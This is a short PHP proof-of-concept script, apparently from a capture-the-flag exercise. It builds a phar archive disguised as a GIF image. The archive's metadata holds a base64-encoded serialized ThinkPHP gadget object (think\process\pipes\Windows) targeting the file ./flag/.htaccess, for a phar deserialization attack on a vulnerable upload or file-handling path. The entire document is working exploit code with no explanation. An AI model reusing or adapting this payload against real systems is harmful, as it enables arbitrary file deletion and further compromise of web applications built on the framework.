<?php
$a = "TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjo4OntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjE2OiIuL2ZsYWcvLmh0YWNjZXNzIjt9czo0MDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwBmaWxlSGFuZGxlcyI7YTowOnt9czozODoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwByZWFkQnl0ZXMiO2E6Mjp7aToxO2k6MDtpOjI7aTowO31zOjQyOiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGRpc2FibGVPdXRwdXQiO2I6MTtzOjU6InBpcGVzIjthOjA6e31zOjE0OiIAKgBpbnB1dEJ1ZmZlciI7aToxO3M6ODoiACoAaW5wdXQiO047czozNDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcUGlwZXMAYmxvY2tlZCI7YjoxO30=";
$b = unserialize(base64_decode($a));
$filename = "poc.phar";
file_exists($filename) ? unlink($filename) : null;
$phar=new Phar($filename);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ");
$phar->setMetadata($b);
$phar->addFromString("foo.txt","bar");
$phar->stopBuffering();
?>